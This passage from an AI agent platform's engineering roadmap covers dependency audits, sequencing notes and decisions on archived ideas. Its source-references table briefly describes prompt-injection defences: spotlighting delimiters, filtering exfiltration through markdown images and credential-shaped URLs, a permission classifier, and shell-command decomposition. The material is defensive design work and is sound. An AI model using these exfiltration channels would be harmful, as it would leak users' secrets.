stylistic note.** Tiers are a narrative; the `Depends on` lines are the real ordering. A graph audit
found **no declared cycles** and a set of cross-tier back-references, listed below.

> **Two corrections, both instructive, both self-inflicted.**
>
> **First:** an early version of this section claimed "no cycles" after auditing only the
> `Depends on:` fields. That was **false** — the binding constraints live in `Done when:` prose, where
> 6.1 declared `Depends on: 4.6` while 4.6's Done-when required escalating to 6.1. A real cycle,
> invisible to the field.
>
> **Second:** the correction then went stale in the opposite direction. That cycle was **resolved** by
> splitting the pause primitive into 1.9, but this section went on asserting a cycle existed. A
> mechanical check (`uv run hack/tools/roadmap_lint.py`) confirms zero declared cycles today. So the
> text describing the error outlived the error — which is the same drift, one level up.
>
> The lesson stands and now has a tool behind it: **`Depends on:` is a summary, not the graph.** Any
> claim about the graph must be generated, not written. Run the linter rather than trusting this
> paragraph — including this sentence.

Known cross-tier back-references where a lower-numbered entry depends on a higher-numbered one:

| Entry | Depends on | Crosses |
|---|---|---|
| 3.3 Per-role scoping | 4.3b | Tier 3 → Tier 4 |
| 4.9b External content | 6.5 | Tier 4 → Tier 6 |
| 4.9c Local runner | 6.2 | Tier 4 → Tier 6 |
| 4.12 Dynamic planning | 6.4 | Tier 4 → Tier 6 |
| 4.13 Definition approval | 6.1, 7.4 | Tier 4 → Tiers 6, 7 |
| 5.2 Memory write path | 6.1 | Tier 5 → Tier 6 |
| 5.7 Task records | 6.4 | Tier 5 → Tier 6 |
| 3.4 Platform-mediated tools | 6.2, 6.5 | Tier 3 → Tier 6 |
| 1.9 Pause primitive | 4.1 | Tier 1 → Tier 4 — **4.1 is itself mis-tiered** |
| 1.1c Dependency graph | 2.3 | Tier 1 → Tier 2 |
| 4.9c Local runner | 1.10 | Tier 4 → Tier 1 *(benign — higher depends on lower)* |

The pattern is not noise: the human-in-the-loop primitives (6.1 queue, 6.2 permissions, 6.5 injection
containment) are **foundations that several Tier 4 and 5 entries genuinely need**, and they landed in
Tier 6 because the tiers were organised by narrative theme rather than by dependency. **Anyone
executing strictly by tier number will stall at roughly half of Tier 4.** Either pull 6.1, 6.2, and 6.5
forward when planning reaches them, or renumber. Do not discover this mid-build.

**Three exceptions to one-plan-per-entry:**
- **Batch tightly coupled pairs.** 2.1 + 2.2 (sandbox lifecycle and its exec plane) and 5.1 + 5.2
  (memory read and write paths) are each one design split across two entries for readability. Planning
  them separately invites an integration seam that does not need to exist.
- **Split oversized entries when planning reveals it.** 1.1 (core data model) and 4.6 (workflow
  composition, orchestrator, and the feedback loop) are visibly larger than their neighbours. Use the
  plan's PR boundaries rather than pretending they are one unit of work.
- **Spikes get a decision record, not an implementation plan.** 0.4 (SNO feasibility), 2.8 (OpenShell
  evaluation), the Nexus-versus-`git-pkgs/proxy` SCC test, and the screenshot-downscaling measurement
  are time-boxed investigations whose deliverable is an answer. Writing an implementation plan for a
  question is a category error.

**Read Part 2A before every planning session, and check the entry against each invariant.** It is a
short numbered table for exactly this purpose; Part 2B is archival rationale and does not need
re-reading. The cross-cutting invariants — the block/tool/integration
distinction, the scope model, no-inbound, agents-propose-humans-approve, the secret boundary — are not
implemented by any single entry, and independently planned entries will diverge on them otherwise. They
are also mirrored in `hack/PROJECT.md` so a fresh session picks them up automatically.

**Suggested first sequence:** 0.1 → 0.2 → 0.3 → **0.5** → 0.4 (spike) → reassess. 0.5 comes before 0.4
because 0.4's done-when requires the Tailscale ingress to reach the cluster. Tier 0 is short, and finishing
it is what turns every later estimate from guesswork into something grounded in a cluster that has
actually run this code.

## Sequencing notes

- **0.4 is deliberately early.** OpenShift SCC behaviour and Agent Substrate/Kata feasibility on SNO are
  the highest-variance unknowns in the whole plan. Finding out at entry 4 is cheap; finding out at
  entry 20 is not.
- **Tier 1 ships a useful product.** Budget-aware LLM routing with a spend dashboard stands on its own
  before a single agent exists.
- **4.3 before 4.4.** A workflow of deterministic code blocks is a working CI pipeline and exercises the
  whole workspace/artifact path without LLM nondeterminism in the way.
- **5.1 could move earlier.** Postgres-backed memory needs only the schema (1.1) and a sandbox to stage
  files into (2.1); it does not depend on VCS semantics. It sits in Tier 5 for narrative grouping with
  supervision, not for dependency reasons. Pull it forward if it starts blocking agent quality.
- **Tier 7 entries are parallelisable** once their data sources exist.
- **4.6 before 4.12, deliberately.** The predefined-workflow path must work and be trusted before the
  dynamic planner is built on top of it, or there is no baseline to compare a generated plan against.
- **6.4 gates 4.12.** Dynamic planning without aggregate spend, concurrency, and depth limits is an
  unbounded loop with a credit card. The dependency is listed and is not optional.
- **5.6 depends on 5.3** only for the supervisor-initiated source; the scheduled and GitHub sources
  could ship earlier if triggers become urgent before supervisors exist.

## Recovered from archived plans — disposition needed

A concept-level audit of `hack/plans/archive/` found eight ideas that existed in reviewed plans and had
no home in this roadmap. Archiving loses ideas unless extraction is systematic; "mine for parts" was
done from memory and therefore incompletely. Each needs an explicit accept or reject — silence is how
they got lost the first time.

| Concept | Source | Disposition |
|---|---|---|
| **Tailscale ingress** | `feat-tailscale-proxy`, unified-gateway epic | **Accepted — now 0.5.** Was assumed by 0.4/1.2/5.6 and built by nothing. |
| **Tool context virtualization** (was `run_platform_tool`) | agent-runtime | **Rejected as premature; the problem it solves does not exist at our scale — see 3.3.** `run_platform_tool(intent)` rejected permanently. Static per-role subsets instead, with a defined trigger for revisiting. |
| **Hybrid Grounding Validator** | agent-runtime | **Accepted, scoped down — now 4.6b.** The deterministic auto-delta half is kept; the LLM-generated-probe half is rejected as premature, which also removes the `bashlex` AST sanitiser it existed to police. |
| **Bulk-Reader delegation** | agent-runtime | **Accepted — folded into 2.2.** Independently validated by Spotify's Portal/shunt writeup (~90% token reduction, same 350-line threshold). Enforced at the tool boundary, covering bash read equivalents. |
| **Day-2 resilience testing** | unified-gateway epic | **Accepted — now 8.5.** Nothing else in the roadmap exercises the platform under failure, which is indefensible for something calling itself production-ready. |
| **ByteChef as an external MCP tool provider** | bytechef research (35KB) | **Rejected on verification.** The earlier recommendation did not survive primary sources — see 3.1. |
| **Fast iteration on block/workflow code** | unified-gateway epic (`git-sync` + `watchdog` supervisor) | **Rejected — dissolved by a design decision, folded into 4.3.** Deterministic blocks carry their command *and an optional inline script* as data, so editing one takes effect immediately with no rebuild. The only residual case is a block needing a new binary dependency in the sandbox image, which is an ordinary image rebuild and not worth a hot-reload mechanism. The original `git-sync` + `watchdog` supervisor was solving a problem DB-canonical definitions remove. |
| **Vercel AI SDK data-stream protocol** | router-temporal | **Accepted — folded into 1.6** (wire format + the `anyio.to_thread.run_sync` warning) **and 5.4** (typed parts for background-dispatch cards). *A quality gate previously caught this table claiming a fold that had not landed; it has now been applied and verified.* Adopt the Vercel AI Data Stream Protocol for the chat surface and get `useChat` for free rather than inventing a wire format *and* a client for it. The archived plan's concern about preserving strict OpenAI compliance on `/v1/chat/completions` does not apply — no OpenAI-compatible endpoint was selected as a client surface, so there is nothing to keep compliant. Carry forward its one durable warning: never run synchronous work in an `async` handler; use `anyio.to_thread.run_sync` or starve the event loop. |

## Source references

Prior art this roadmap draws on directly, with resolvable pointers. Several entries cite these as
authority; a citation a future session cannot follow is not a citation.

| Source | Used by | What was taken |
|---|---|---|
| [`code-quality` plugin README](https://github.com/wgordon17/personal-claude-marketplace/blob/main/code-quality/README.md) | 4.9 | Five proven multi-agent orchestration shapes seeded as the first-party workflow library: code-change loop, fresh-context adversarial review, generate→verify two-stage, isolated competition with a judge, chunk/map/reduce. Also the model-tiering-by-judgment-load pattern that 4.3b's Agent entity enables, and the guardrail-versus-pipeline activation split reflected in 5.6. |
| [`dev-guard` plugin README](https://github.com/wgordon17/personal-claude-marketplace/blob/main/dev-guard/README.md) | 2.2, 6.2 | Command decomposition (split on `&&`/`||`/`;`, recurse into subshells and `bash -c`, strip env prefixes) and per-segment pipe evaluation; ordered most-specific-first matching; block-rules-never-trustable; scoped trust (`session`/`always`); risk tiers derived from the object acted on; credential scrubbing before audit write; rule-config validation. **Divergence recorded in 6.2:** it fails open as developer tooling; the platform fails to escalation. |
| [`summon-claude`](https://github.com/summon-claude/summon-claude/) (public; Python; **source reviewed, not summarised**) | 6.2, 6.5, 5.6 | Nonce-based spotlighting with per-process `secrets.token_hex(8)` delimiters; stripping delimiters from agent output to prevent nonce leakage; output-side exfiltration filtering (markdown/HTML images, credential-shaped URL params); the LLM permission classifier with allow/block/**uncertain** and a consecutive-block circuit breaker. |
| [Spotify Portal/shunt writeup](https://engineering.atspotify.com/2026/9/portal-by-spotify-cut-my-claude-code-token-usage-by-90) | 2.2 | Batched question-scoped bulk reads (~90% token reduction, 350-line threshold); enforcement at the tool boundary rather than in instructions; intercepting shell read equivalents; not delegating editing or reasoning. |
| [`osac-project/osac`](https://github.com/osac-project/osac) (public) plus the local `~/Projects/osac` working layout | Part 2, 2.4 | The spine pattern that motivated 1:N project→repo cardinality, and the per-project `.gitconfig` (identity, `pull.rebase`, excludes, commit-trailer policy) that 2.4 materialises into workspaces. **Note the two are not the same thing:** `osac-project/osac` is now a monorepo consolidating fulfillment-service, osac-operator, osac-aap, and osac-installer, while the local directory is the spine layout with ~20 sibling checkouts beside it. Both shapes must work — the monorepo is one repo binding with a coarser internal layout; the spine is many bindings under one project. |

Research reports produced during this session live in `hack/research/`; superseded plans mined for
parts are in `hack/plans/archive/`.
